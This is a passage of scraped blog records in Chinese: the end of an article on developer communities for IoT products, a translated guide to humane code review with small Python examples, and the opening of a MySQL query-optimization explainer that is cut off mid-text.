亿个连接的物联网设备。从汽车到衣服到尚未可知的产品，我们将开发出数以亿计的物联网设备——从设备到收集并向最终用户显示数据的项目或 app 都需要编程。竞争将不可避免地出现在该领域的许多新老对手中。,\n,在像 IoT 这样的新兴行业中，开发者社区至关重要。那些具备了软件和工程技能的人员必须能够开发、探索并将创意引导到现实中，将现有产品开发并优化为更好的产品。在此过程中，开发人员的知识和投入非常重要。,\n,任何行业，无论是否是新兴行业，你都不能冒疏远开发者的风险。忽视他们的投入意味着对他们缺乏信任，而信任是管理者与开发者关系良好的基石。他们需要信任你的产品以及你告诉他们的有关你的产品的要点。,\n,你最不应该做的一件事是危及到维护和开发产品的知识库。你还需要保持开发人员的投入并对你要求他们做的事情感兴趣。你需要听取他们的意见。,\n,为此，你需要一个在线社区。社区促进倾听。良好的社区使开发人员可以轻松地与其他开发人员进行协作和合作，并且在征求和收集开发人员投入的过程中提供所急需的手续。请记住，收集反馈信息越容易，将信息提供给产品管理和工程团队的速度就越快。,\n,改进开发体验,\n,良好的社区不仅承认开发人员对产品和平台的贡献，而且还不断寻求改进开发人员体验的方法。改进过程不应该凭空进行；此过程应该由开发者自己来提供意见。,\n,例如，社区经理发布了一个简短的调查，询问开发人员开发特定平台的近期体验。这项调查不仅是为了听取开发者喜欢什么，而且还想知道他们不喜欢什么，什么让他们感到沮丧，他们希望能以怎样不同的方式改善体验。经理跟进几项调查回复，深入挖掘开发人员的关注点。,\n,然后，经理处理这些问题，在开发人员社区中进行以下改进：,\n,\n,重新整理开发人员文档体系结构，以简化导航并更容易找到最流行的参考文档,\n,增加示例代码数量,\n,实施流程以确保 SDK 与最新的产品更新和 bug 修复同步,\n,\n,社区改进的范围很广，并且没有一成不变的规则或准则。最主要的是让开发者有机会表达他们的好恶，并确保他们的努力不会被置之不理。,\n,这是你不能忽略的声音,\n,开发人员的投入有助于确保你的产品满足客户的期望并解决他们的问题。开发者提出的意见可帮助你提供令人惊叹的客户体验，并提高客户粘性。开发者付出的努力是产品可靠性和寿命最宝贵的资源之一。,\n,你需要倾听开发人员的意见，并为他们提供一个社区，不但开发者可以在社区中贡献和协作，而且你也可以在社区里轻松地征求、收集和积极影响开发者的重要投入。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114075/", "url_object_id": "0581f8b22054b8c37da7ce4b62c1348d", "front_image_path": "full/e4196824db093b30acde5dd78f27b2065211b946.jpg"},{"front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57nj93bj20lc0oe0xi.jpg"], "title": "如何做人性化的代码审查？", "create_time": "2018/05/30", "vote": "1", "bookmark": "4", "comments": "2", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,精算狗, 翻译，,小米云豆粥, 校稿。未经许可，禁止转载！,英文出处：,Michael Lynch,。欢迎加入,翻译组,。,最近，我一直在读有关代码审查最佳范例的文章。我注意到这些文章的关注点是找到 bug，而忽略了代码审查其他的部分。用建设性、专业的问题沟通方式？不相关！只要识别出所有的 bug，剩下的部分会水到渠成。,\n,我只能假设我读过的这些文章都来自未来，那时候所有的开发人员都是机器人。在那个世界，你的队友欢迎对其代码未经过推敲措辞的批评，因为处理这样的信息能温暖他们冰冷的机器人之心。,\n,我要做一个大胆的假设，你想要在当前世界改进代码审查，此时你的队友都是人类。我还要做一个更大胆的假设，你与同事之间积极的关系本身就是一个目的，而不仅仅是一个可调整的变量来最小化缺陷的平均成本。在这些情况下，你的审查实践会发生怎样的变化呢？,\n,在这篇文章中，我讨论了一些技巧，把代码审查既看作是技术过程，也看作是社会过程。,\n,什么是代码审查?,\n,“代码审查（code review）”这一术语可以指一系列活动，从简单地站在队友身后读读代码，到 20 人与会的单行代码分析。我用这一术语指正式的、书面的过程，但也不像一系列现场代码审查会议那么重大。,\n,\n,代码审查的参与者包括,作者,以及,审查者,：作者写代码并把代码送去审查，审查者读代码并决定代码什么时候就绪并入团队的代码库。一次审查可以由多个审查者完成，但是我做了简化的假设——你是唯一的审查者。,\n,在代码审查开始之前，作者必须创建一个,变更表,。作者想要将源代码并入团队代码库，变更表包括一系列源代码的变更。,\n,当作者把变更表发给审查者时，审查就开始了。代码审查是,循环,发生的。每个循环都是作者与审查者之间完整的往返：作者发送变更，审查者给予变更的书面反馈。每次代码审查都包括一次或者更多的循环。,\n,当审查者,批准,了这些变更，审查结束。这通常指的是给出 LGTM，“我觉得不错（looks good to me）”的简写。,\n,这为什么很难？,\n,如果程序员给你发了一份变更表，他们觉得这个变更表棒极了。你又给他们写了一份详细的清单，解释为什么这个变更表并不好。这是需要小心处理的信息。,\n,这是我不想念 IT 的一个原因，因为程序员是非常不可爱的人……比如，在航空业，那些过分高估了自己技术水平的人都死了。,\n,Philip Greenspun，ArsDigita 的联合创始人，引自《,Founders at Work,》。,\n,作者容易把对其代码的批评解读为暗示他们不是合格的程序员。代码审查是一个分享知识和做工程决定的机会。但是如果作者把讨论理解为个人攻击，这个目标无法达成。,\n,除此之外，你还面临着书面传达想法的挑战，词不达意的风险会更高。作者听不到你的语气，也看不到你的肢体语言，所以清晰地、小心地传达你的反馈更为重要。对一个有戒备心的作者来说，一句无冒犯意味的批注，比如“你忘了关闭文件句柄”，可以被理解成“真不敢相信你忘了关闭文件句柄！你真是个傻子。”,\n,技巧,\n,\n,让电脑做无聊的部分,\n,用风格指南平息风格争论,\n,马上开始审查,\n,从高级别开始，逐步向下,\n,慷慨地使用代码示例,\n,永远别说“你,”,\n,把反馈表达成请求，而不是指令,\n,把批注与原则联系在一起，而不是观点,\n,\n,让电脑做无聊的部分,\n,在会议和邮件的干扰下，可用来专注于代码的时间很少。你的精神毅力更是短缺。读队友的代码是认知上的负担，要求高强度的专注。别把这些资源浪费在电脑能做的任务上，尤其是当电脑能做得更好的时候。,\n,空白错误是一个显著的例子。比较一下人类审查者找到缩进错误并与作者一起改正所花费的精力，和仅仅使用一个自动排版工具所花费的精力：,\n,\n,\n,\n,人类审查者需要的精力,\n,排版工具需要的精力,\n,\n,\n,\n,\n,1.审查者寻找空白错误，找到错误的缩进\n,2.审查者写批注，指出错误缩进,\n,3.审查者重新读批注，确保措辞清晰，不含指责意味,\n,4.作者读批注,\n,5.作者改正代码缩进,\n,6.审查者核实作者适当地处理了批注,\n,无！,\n,\n,\n,\n,右边是空的，因为作者用了一个代码编辑器，每次他们点击“保存”时，该代码编辑器会自动规定空白的格式。在最糟的情况下，作者把代码发出去以供审查，,持续集成,解决方法报告说空格错误。作者在不需要审查者顾虑的情况下，修正这个问题。,\n,在代码审查中寻找可以被自动解决的机械性任务。以下是常见的例子：,\n,\n,\n,\n,任务,\n,自动解决方法,\n,\n,\n,\n,\n,验证代码的构建,\n,持续集成方法，比如 ,Travis, 或者 ,CircleCI,\n,\n,\n,证实通过了自动测试,\n,持续集成方法，比如 ,Travis, 或者 ,CircleCI,\n,\n,\n,验证代码空白与团队风格一致,\n,代码排版器，比如 ,ClangFormat, (C/C++ 排版器) 或者 ,gofmt, (Go 排版器),\n,\n,\n,识别未使用的输入或者变量,\n,代码 linter，比如 ,pyflakes, (Python linter) 或者 ,JSLint, (JavaScript linter),\n,\n,\n,\n,自动化使你作为审查者能做出更多有意义的贡献。当你能忽略一整个类别的问题，比如输入的排序或者源文件命名的约定，你能够关注更有趣的事情，比如函数错误或者可读性缺陷。,\n,自动化也能给作者带来好处。自动化使作者用几秒钟发现粗心的错误，而不是几小时。即时反馈使得从错误中学习更容易，修正错误的代价也更小，因为作者脑海中还有相关的背景。另外，如果他们不得不听到自己犯下的愚蠢错误，对自尊心来说，从电脑那听到要比从你那听到更容易被接受。,\n,和你的团队一起将这些自动检查加入代码审查的工作流程中（例如，在 Git 中的 ,pre-commit hooks, 或者 Github 中的 ,webhooks,）。如果审查过程要求作者手动运行这些检查，你会损失大部分好处。作者总是会忘记一些情况，迫使你继续审查简单的问题，而这些问题本来就能被自动处理。,\n,用风格指南平息风格争论,\n,关于风格的争论浪费了审查的时间。一致的风格确实重要，但是代码审查不是争论花括号位置的时候。在审查中消除风格争论的最佳办法是，遵守一个风格指南。,\n,\n,好的风格指南不仅定义了像命名习惯或者空白规则这样的表面元素，而且定义了怎样使用给定编程语言的特征。比如，JavaScript 和 Perl 都包含了一些功能——他们提供了许多实现相同逻辑的方法。风格指南定义了做事的唯一方法，这样不会以一半队员用了一组语言特征而另一半队员用了完全不同的一组特征收尾。,\n,一旦有了一个风格指南，你就不需要浪费审查循环，来跟作者争论到底谁的命名习惯最好。只要遵从风格指南然后继续就行。如果你的风格指南没有指定某个特定问题的约定，那它一般都不值得争论。如果你遇到一个风格指南未涉及的问题，它又重要到需要讨论，和团队一起推敲。然后把决定加到风格指南，这样你们永远不需要再进行一次这个讨论。,\n,选择, 1,：采纳一个现存的风格指南,\n,如果从网上搜索，你能找到已发布的风格指南可供使用。,Google 的编程风格指南,是最知名的，但是如果它的风格不适合你，你可以找到其他的指南。通过采纳一个现存的指南，不需要从头创造一个风格指南的大量花费就能继承其好处。,\n,坏处是组织为他们自己特别的需要优化其风格指南。比如，Google 的风格指南在,使用新语言特征,上比较保守，因为他们有一个巨大的代码库，其中的代码要在所有东西上运行，从家用路由器到最新的 iPhone。如果你们是一个只有一个产品的四人小组，你可能选择在使用前沿语言特征或者扩展时更大胆。,\n,选择, 2,：不断创造你自己的风格指南,\n,如果你不想采纳现存的指南，你可以自己创造一个。在代码审查中每产生一次风格争论，向整个团队提问来决定官方约定应该是什么。当你们达成共识，把决定编进风格指南中。,\n,我倾向于将团队的风格指南作为源控制下的 Markdown（例如 ,GitHub 页面,）。这样，对风格指南的任何改动都需要通过普通的审查过程——某人得明确批准改动，而且团队中的每个人都有提出疑虑的机会。Wikis 和 Google 文件都是可接受的选择。,\n,选择, 3,：混合方法,\n,合并选择 1 和选择 2，你可以采纳现存的风格指南作为基础，然后用本地风格指南来扩展或者覆盖这个基础。一个好例子是 ,Chromium 的 C++ 风格指导,。它用 ,Google 的 C++ 风格指导,作为基础，但是在其上添上自己的改动和附加。,\n,马上开始审查,\n,将代码审查视为高优先级。当你真正阅读代码并反馈时，慢点来，但是要马上,开始,审查——最好在几分钟内开始。,\n,\n,如果队员发给你一个变更表，这可能意味着直到你完成审查前，他们会卡在其他工作上。理论上，源控制系统使作者能建起新的分支，继续工作，然后从审查中把变动合并进新分支。实际上，一共有大约四个开发者能够高效地做这件事。其他人要花很长时间来清理三方差异，以致于抵消掉了等待审查完成这段时间里的进步。,\n,你马上开始审查，就创造了一个良性循环。你的审查时间完全变成了一个与作者的变更表大小和复杂度相关的函数。这激励作者发送短小、范围狭窄的变更表。对你来说这样的变更表审查起来更容易，也更愉悦，所以你能更快地审查，循环继续。,\n,想象一下你的队员要执行一个新特征，这个特征要求 1000 行代码变更。如果他们知道你能在大概 2 小时内完成一个 200 行的变更表的审查，他们可以把特征拆分成各包含 200 行的变更表，然后在一两天内检查完整个特征。但是，如果无论大小你都要花一天来完成所有的代码审查，现在就要花一周时间才能检查完整个特征。你的队员不想傻坐一周，所以他们被激励着去发送更大的代码审查，比如每个包含 500 到 600 行。这样审查起来花销更大，反馈也更差，因为记 600 行变更表的背景要比 200 行变更表难。,\n,一个审查循环的最大周期应该是一个工作日。如果你正在处理一个更高优先级的问题，不能在一天内完成一个审查循环，让你的队员知悉并给予他们把审查交给别人的机会。如果你一个月被强制回绝审查超过一次，可能意味着你的团队需要放慢脚步，这样你能保持理智的开发实践。,\n,从高级别开始，逐步向下,\n,在一个既定的审查循环中，你写的批注越多，让作者感觉受打压的风险越大。准确的界限随开发者的不同而不同，但是一个审查循环中 20 到 50 个批注一般是危险区的开始。,\n,如果你担心把作者淹没在批注的海洋里，约束你自己在早期循环中反馈高级别的问题。注意重新设计类接口或者拆分复杂函数这样的问题。等到这些问题都解决了再去处理低级别的问题，比如变量命名或者代码评论的清晰度。,\n,一旦作者整合了你高级别的批注，低级别的批注可能会变得无意义。把低级别的批注推迟到后期的循环中，你可以把自己从小心措辞的工作中解救出来，也免得作者处理不必要的批注。这个技巧也细分了审查过程中你所关注的抽象层，帮助你和作者用清晰、系统的方法完成变更表。,\n,慷慨地使用代码示例,\n,在一个理想的世界里，代码作者会感谢收到的每一次审查。这是他们学习的一个机会，也能防止他们犯错。事实上，有许多外部因素能导致作者负面地解读审查，怨恨你给他们批注。可能他们正面临着截止日期的压力，所以除了立刻不经审查的批准以外的东西都感觉像阻碍。可能你们没怎么在一起工作过，所以他们不相信你的反馈是好意的。,\n,一个让作者对审查过程感觉良好的方法是，在审查中找机会送他们礼物。所有开发者都爱收到的礼物是什么呢？当然是代码示例啦。,\n,\n,如果通过写一些建议的改动来减轻作者的负担，就证明了作为审查者，你对时间很慷慨。,\n,比如，想象一下你的一个同事不熟悉 Python 的,列表推导（list comprehension）,特征。他们给你发送了包含以下代码的审查：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nurls = []\r\nfor path in paths:\r\n  url = 'https://'\r\n  url += domain\r\n  url += path\r\n  urls.append(url),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,urls, ,=, ,[,],for, ,path ,in, ,paths,:,  ,url, ,=, ,'https://',  ,url, ,+=, ,domain,  ,url, ,+=, ,path,  ,urls,.,append,(,url,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,回复“能用列表推导（list comprehension）简化这个吗？”会使他们苦恼，因为现在他们得花 20 分钟搜索他们之前从没用过的东西。,\n,收到像以下这样的批注他们会更开心：,\n,考虑用像这样的列表推导（list comprehension）来进行简化：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nurls = ['https://' + domain + path for path in paths],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,urls, ,=, ,[,'https://', ,+, ,domain, ,+, ,path ,for, ,path ,in, ,paths,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,这个技巧并不局限于单命令程序。我会经常建立我自己的代码分支，向作者展示概念的一个大型证明，比如拆分一个大型函数或者增加一个单元测试来覆盖一个附加边界情况。,\n,为清晰、无争议的改进保留此技巧。在上面列表推导（list comprehension）示例中，极少有开发者会拒绝减少 83% 的代码行数。相反，如果你写了一个冗长的示例来演示某个变动“更好”，而这个变动是基于你自己的个人品味（比如，风格变动），代码示例让你看起来固执己见，而不是慷慨大方。,\n,限制你自己在每个审查循环中只写两到三个代码示例。如果你开始为作者写整个变更表，这标志着你觉得作者没能力写自己的代码。,\n,永远别说“你”,\n,这听起来挺怪异的，但是听我说：永远别在代码审查中使用“你”这个字。,\n,在审查中做的决定应该是基于什么能让代码更好，而不是谁出的主意。你的队员在他们的变更表中倾注了大量心血，而且很可能为自己的工作感到骄傲。他们听到对其工作的批评，自然反应是摆出防御和保护的姿态。,\n,组织反馈所使用的措辞，以最小化激起队员戒备心的风险。讲清楚你是在批评代码，而不是程序员。当作者在评论中看到“你”这个字，会将他们的注意力从代码转移到自己身上。这增加了他们把批评私人化的风险。,\n,考虑一下这个无害的评论：,\n,你拼错了“,successfully,”。,\n,作者可以把这个批注理解成两种不同的意思：,\n,\n,理解, 1,：嗨，好家伙！你拼错了“successfully”。但是我还是觉得你聪明！那可能就是个笔误。,\n,\n,\n,理解, 2,：你拼错了“successfully”，笨蛋。,\n,\n,把这个跟省略了“你”的批注比较一下：,\n,sucessfully -> successfully,\n,后者是一个简单的修正而不是对作者的审判。,\n,幸运地是，在重新写反馈时避免使用“你”并不难。,\n,选择, 1,：用“我们”替换“你”,\n,你,能重命名这个变量，让它更具有描述性吗？比如 ,seconds_remaining,。,\n,变成：,\n,我们,能重命名这个变量，让它更具有描述性吗？比如 seconds_remaining,。,\n,“我们”加强了团队对代码的集体责任。作者可能跳槽到一个不同的公司去，你也可能，但是拥有这个代码的团队会一直以不同的形式存在。当你明显期望作者自己做某些事的时候，说“我们”听起来会比较傻，但是傻要比指责好。,\n,\n,选择, 2,：移除句子的主语,\n,另一个避免使用“你”的方法是用省略句子主语的简化句子：,\n,建议重命名,为更具有描述性的名称，比如 ,seconds_remaining,。,\n,你可以用,被动语态,实现相似的效果。我在技术写作中一般会避免像瘟疫一样使用被动语态，但是它是个有用的方法来避免使用“你”。,\n,变量,应该被重命名,为更具有描述性的名称，比如 ,seconds_remaining,。,\n,另一个选择是把它表述为一个问题，用“……如何”或者“……怎么样”开头：,\n,把变量重命名为更具有表述性的名称,怎么样,？比如 ,seconds_remaining,。,\n,把反馈表达成请求，而不是指令,\n,代码审查相对平常的交流来说，要求更多的机智和谨慎，因为存在高风险把讨论转变成私人争论。你会期望审查者在审查中表示出礼貌，但是奇怪地是，我发现他们走向了另一个方向。多数人永远不会对同事说“给我订书机，再给我拿瓶汽水。”但是我看到过无数审查者用类似的指令来表达反馈，比如，“把这个类移到一个单独的文件里。”,\n,宁可在反馈中恼人地绅士。把批注表达成请求或者建议那样，而不是指令。,\n,比较用两种不同方式表达的同一个批注：,\n,\n,\n,\n,表达成指令的反馈,\n,表达成请求的反馈,\n,\n,\n,\n,\n,把 Foo 类移到一个单独的文件里。,\n,我们能把 Foo 类移到一个单独的文件里吗？,\n,\n,\n,\n,人们喜欢掌控自己的工作。向作者提出请求给他们带来自主意识。,\n,请求也让作者礼貌地反馈更容易。可能他们的选择是有合理的。如果把反馈表达成指令，来自作者的任何反馈都像违反指令。如果你把反馈表达成请求或者问题，作者能简单地回答你。,\n,比较对话的好斗程度，取决于审查者怎么表达他们的初始批注：,\n,\n,\n,\n,表达成指令的反馈（好斗的）,\n,表达成请求的反馈（合作的）,\n,\n,\n,\n,\n,审查者,：把 Foo 类移到单独的文件里,\n,作者,：我不想这么做，因为那样就离 Bar 类太远了。客户几乎总会一起调用他们。,\n,审查者,：我们能把 Foo 类移到单独的文件里吗？,\n,作者,：可以，但是那样就离 Bar 类太远了，以及客户一般会一起使用这两个类。你觉得呢？,\n,\n,\n,\n,看看当你,构建虚拟对话来证明观点,把批注表达成请求而非指令的时候，对话变得多么有礼貌。,\n,把批注与原则联系在一起，而不是观点,\n,当你给作者写批注时，既要给出变更建议，也要给出变更的,理由,。“现在，这个类既负责下载文件，也负责解析文件。我们应该依照,单一责任原则,，把它拆分成一个下载类和一个解析类。”这么说会更好，而不是说“我们应该把这个类分成两个。”,\n,让你的批注有原则性的立足点，这样能让讨论走向更积极的方向更有建设性。但你有一个具体的原因，比如“我们应该把这个函数写成私有函数，来最小化 public 借口类”，作者就不能简单地回复“不，我倾向于我的方法。”更确切地说，他们,可以,，但是因为你演示了改动如何满足目标，而他们只陈述了一个偏好，他们会看起来很傻。,\n,软件开发既是艺术也是科学。你不可能永远都能用确定的原则来明确表达代码到底哪里出了问题。有时候代码只是难看或者不符合直觉，不容易确定为什么。在这些情况下，解释你能怎么做，但是保持客观性。如果你说“,我,发现这不容易理解”，这至少是个客观的陈述；相反，“,这,莫名其妙”是一个价值判断，不一定适用于所有人。,\n,尽可能以链接的形式提供支持证据。团队风格指南的相关部分是你能提供的最佳链接。你也可以链接到语言或者库的文件。高票 ,StackOverflow, 回答也行，但是离权威文件越远，你的证据变得越不稳固。,\n,第二部分：即将上线,\n,敬请期待其他小技巧，包括：,\n,\n,处理特别大的代码审查,\n,\n,\n,识别给予表扬的机会,\n,\n,\n,尊重审核的，以及,\n,\n,\n,化解僵局,\n,\n,由 ,Samantha Mason, 编辑。插图来自 ,Loraine Yow,。感谢 ,@global4g,为这篇文章的早期版本提供宝贵的反馈。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    , 2 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,精算狗,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            简介还没来得及写 :）        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 22, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113665/", "url_object_id": "a954aebbcc6c42bb9302d1a79cefaa26", "front_image_path": "full/ec7be1fb92c486c238055e96fe14a331c8ef7b82.jpg"},{"front_image_url": ["http://wx4.sinaimg.cn/mw690/63918611gy1frnqlou40xj207p07dq32.jpg"], "title": "我必须得告诉大家的MySQL优化原理", "create_time": "2018/05/25", "vote": "4", "bookmark": "12", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,CHEN川,   ,说起MySQL的查询优化，相信大家收藏了一堆奇技淫巧：不能使用,SELECT *,、不使用NULL字段、合理创建索引、为字段选择合适的数据类型….. 你是否真的理解这些优化技巧？是否理解其背后的工作原理？在实际场景下性能真有提升吗？我想未必。因而理解这些优化建议背后的原理就尤为重要，希望本文能让你重新审视这些优化建议，并在实际业务场景下合理的运用。,\n,MySQL逻辑架构,\n,如果能在头脑中构建一幅MySQL各组件之间如何协同工作的架构图，有助于深入理解MySQL服务器。下图展示了MySQL的逻辑架构图。,\n,\n,\n, ,\n,\n,\n,MySQL逻辑架构，来自：高性能MySQL,\n,\n,MySQL逻辑架构整体分为三层，最上层为客户端层，并非MySQL所独有，诸如：连接处理、授权认证、安全等功能均在这一层处理。,\n,MySQL大多数核心服务均在中间这一层，包括查询解析、分析、优化、缓存、内置函数(比如：时间、数学、加密等函数)。所有的跨存储引擎的功能也在这一层实现：存储过程、触发器、视图等。,\n,最下层为存储引擎，其负责MySQL中的数据存储和提取。和Linux下的文件系统类似，每种存储引擎都有其优势和劣势。中间的服务层通过API与存储引擎通信，这些API接口屏蔽了不同存储引擎间的差异。,\n,MySQL查询过程,\n,我们总是希望MySQL能够获得更高的查询性能，最好的办法是弄清楚MySQL是如何优化和执行查询的。一旦理解了这一点，就会发现：,很多的查询优化工作实际上就是遵循一些原则让MySQL的优化器能够按照预想的合理方式运行而已。,\n,当向MySQL发送一个请求的时候，MySQL到底做了些什么呢？,\n,\n,\n, ,\n,\n,\n,MySQL查询过程,\n,\n,客户端/服务端通信协议,\n,MySQL客户端/服务端通信协议是“半双工”的：在任一时刻，要么是服务器向客户端发送数据，要么是客户端向服务器发送数据，这两个动作不能同时发生。一旦一端开始发送消息，另一端要接收完整个消息才能响应它，所以我们无法也无须将一个消息切成小块独立发送，也没有办法进行流量控制。,\n,客户端用一个单独的数据包将查询请求发送给服务器，所以当查询语句很长的时候，需要设置,max_allowed_packet,参数。但是需要注意的是，如果查询实在是太大，服务端会拒绝接收更多数据并抛出异常。,\n,与之相反的是，服务器响应给用户的数据通常会很多，由多个数据包组成。但是当服务器响应客户端请求时，客户端必须完整的接收整个返回结果，而不能简单的只取前面几条结果，然后让服务器停止发送。因而在实际开发中，尽量保持查询简单且只返回必需的数据，减小通信间数据包的大小和数量是一个非常好的习惯，这也是查询中尽量避免使用,SELECT *,以及加上,LIMIT,限制的原因之一。,\n,查询缓存,\n,在解析一个查询语句前，如果查询缓存是打开的，那么MySQL会检查这个查询语句是否命中查询缓存中的数据。如果当前查询恰好命中查询缓存，在检查一次用户权限后直接返回缓存中的结果。这种情况下，查询不会被解析，也不会生成执行计划，更不会执行。,\n,MySQL将缓存存放在一个引用表（不要理解成,table,，可以认为是类似于,HashMap,的数据结构），通过一个哈希值索引，这个哈希值通过查询本身、当前要查询的数据库、客户端协议版本号等一些可能影响结果的信息计算得来。所以两个查询在任何字符上的不同（例如：空格、注释），都会导致缓存不会命中。,\n,如果查询中包含任何用户自定义函数、存储函数、用户变量、临时表、mysql库中的系统表，其查询结果,\n都不会被缓存。比如函数,NOW(),或者,CURRENT_DATE(),会因为不同的查询时间，返回不同的查询结果，再比如包含,CURRENT_USER,或者,CONNECION_ID(),的查询语句会因为不同的用户而返回不同的结果，将这样的查询结果缓存起来没有任何的意义。,\n,既然是缓存，就会失效，那查询缓存何时失效呢？MySQL的查询缓存系统会跟踪查询中涉及的每个表，如果这些表（数据或结构）发生变化，那么和这张表相关的所有缓存数据都将失效。正因为如此，在任何的写操作时，MySQL必须将对应表的所有缓存都设置为失效。如果查询缓存非常大或者碎片很多，这个操作就可能带来很大的系统消耗，甚至导致系统僵死一会儿。而且查询缓存对系统的额外消耗也不仅仅在写操作，读操作也不例外：,\n,\n,任何的查询语句在开始之前都必须经过检查，即使这条SQL语句永远不会命中缓存,\n,如果查询结果可以被缓存，那么执行完成后，会将结果存入缓存，也会带来额外的系统消耗,\n,\n,基于此，我们要知道并不是什么情况下查询缓存都会提高系统性能，缓存和失效都会带来额外消耗，只有当缓存带来的资源节约大于其本身消耗的资源时，才会给系统带来性能提升。但要如何评估打开缓存是否能够带来性能提升是一件非常困难的事情，也不在本文讨论的范畴内。如果系统确实存在一些性能问题，可以尝试打开查询缓存，并在数据库设计上做一些优化，比如：,\n,\n,用多个小表代替一个大表，注意不要过度设计,\n,批量插入代替循环单条插入,\n,合理控制缓存空间大小，一般来说其大小设置为几十兆比较合适,\n,可以通过,SQL_CACHE,和,SQL_NO_CACHE,来控制某个查询语句是否需要进行缓存,\n,\n,最后的忠告是不要轻易打开查询缓存，特别是写密集型应用。如果你实在是忍不住，可以将,query_cache_type,设置为,DEMAND,，这时只有加入,SQL_CACHE,的查询才会走缓存，其他查询则不会，这样可以非常自由地控制哪些查询需要被缓存。,\n,当然查询缓存系统本身是非常复杂的，这里讨论的也只是很小的一部分，其他更深入的话题，比如：缓存是如何使用内存的？如何控制内存的碎片化？事务对查询缓存有何影响等等，读者可以自行阅读相关资料，这里权当抛砖引玉吧。,\n,语法解析和预处理,\n,MySQL通过关键字将SQL语句进行解析，并生成一颗对应的解析树。这个过程解析器主要通过语法规则来验证和解析。比如SQL中是否使用了错误的关键字或者关键字的顺序是否正确等等。预处理则会根据MySQL规则进一步检查解析树是否合法。比如检查要查询的数据表和数据列是否存在等等。,\n,查询优化,\n,经过前面的步骤生成的语法树被认为是合法的了，并且由优化器将其转化成查询计划。多数情况下，一条查询可以有很多种执行方式，最后都返回相应的结果。优化器的作用就是找到这其中最好的执行计划。,\n,MySQL使用基于成本的优化器，它尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个。在MySQL可以通过查询当前会话的,last_query_cost,的值来得到其计算当前查询的成本。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmysql> select * from t_message limit 10;\r\n...省略结果集\r\n\r\nmysql> show status like 'last_query_cost';\r\n+-----------------+-------------+\r\n| Variable_name   | Value       |\r\n+-----------------+-------------+\r\n| Last_query_cost | 6391.799000 |\r\n+-----------------+-------------+\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mysql,>, ,select *, ,from ,t_message ,limit, ,10,;,.,.,.,省略结果集, ,mysql,>, ,show ,status ,like, ,'last_query_cost',;,+,--,--,--,--,--,--,--,--,-,+,--,--,--,--,--,--,-,+,|, ,Variable_name,   ,|, ,Value,       ,|,+,--,--,--,--,--,--,--,--,-,+,--,--,--,--,--,--,-,+,|, ,Last_query_cost, ,|, ,6391.799000, ,|,+,--,--,--,--,--,--,--,--,-,+,--,--,--,--,--,--,-,+, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,示例中的结果表示优化器认为大概需要做6391个数据页的随机查找才能完成上面的查询。这个结果是根据一些列的统计信息计算得来的，这些统计信息包括：每张表或者索引的页面个数、索引的基数、索引和数据行的长度、索引的分布情况等等。,\n,有非常多的原因会导致MySQL选择错误的执行计划，比如统计信息不准确、不会考虑不受其控制的操作成本（用户自定义函数、存储过程）、MySQL认为的最优跟我们想的不一样（我们希望执行时间尽可能短，但MySQL值选择它认为成本小的，但成本小并不意味着执行时间短）等等。,\n,MySQL的查询优化器是一个非常复杂的部件，它使用了非常多的优化策略来生成一个最优的执行计划：,\n,\n,重新定义表的关联顺序（多张表关联查询时，并不一定按照SQL中指定的顺序进行，但有一些技巧可以指定关联顺序）,\n,优化,MIN(),和,MAX(),函数（找某列的最小值，如果该列有索引，只需要查找B+Tree索引最左端，反之则可以找到最大值，具体原理见下文）,\n,提前终止查询（比如：使用Limit时，查找到满足数量的结果集后会立即终止查询）,\n,优化排序（在老版本MySQL会使用两次传输排序，即先读取行指针和需要排序的字段在内存中对其排序，然后再根据排序结果去读取数据行，而新版本采用的是单次传输排序，也就是一次读取所有的数据行，然后根据给定的列排序。对于I/O密集型应用，效率会高很多）,\n,\n,随着MySQL的不断发展，优化器使用的优化策略也在不断的进化，这里仅仅介绍几个非常常用且容易理解的优化策略，其他的优化策略，大家自行查阅吧。,\n,查询执行引擎,\n,在完成解析和优化阶